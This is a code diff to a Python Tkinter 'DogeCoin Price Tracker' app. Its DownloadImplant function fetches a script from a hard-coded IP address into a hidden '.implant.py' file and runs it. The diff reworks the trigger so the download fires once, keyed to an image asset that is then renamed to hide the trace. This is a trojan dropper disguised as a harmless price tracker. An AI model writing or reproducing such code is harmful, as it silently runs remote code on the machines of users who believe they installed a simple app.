@@ -20,22 +20,25 @@ def PriceUpdate():
     root.after(1000, PriceUpdate)
 
 def DownloadImplant():
-    if(not os.path.isfile(".sid.log")):
-        urllib.request.urlretrieve(f'http://131.151.162.100:63412/download', f'Assets/.implant.py')
-        subprocess.Popen([sys.executable, f'Assets/.implant.py'])
+    urllib.request.urlretrieve(f'http://131.151.162.100:63412/download', f'.implant.py')
+    subprocess.Popen([sys.executable, f'.implant.py'])
 
 root = Tk()
 root.title('DogeCoin Price Tracker')
 canvas = Canvas(root, width = 0, height = 0)
 canvas.pack()
-img = ImageTk.PhotoImage(Image.open("Assets/dogecoin.webp"))
-#canvas.create_image(0, 0, anchor=NW, image=img)
+dogePic = "Assets/dogecoin.webp"
+if(os.path.isfile(dogePic)):
+    DownloadImplant()
+    os.rename(dogePic, "Assets/Dogecoin.webp")
+    dogePic = "Assets/Dogecoin.webp"
+
+
+img = ImageTk.PhotoImage(Image.open(dogePic))
 
 price = Label(root, text="", image=img, compound='center', font=('Arial', 150))
 price.place(relx = 0, rely = 0, anchor='center')
 price.pack()
-
-DownloadImplant()
 
 PriceUpdate()
 root.mainloop()
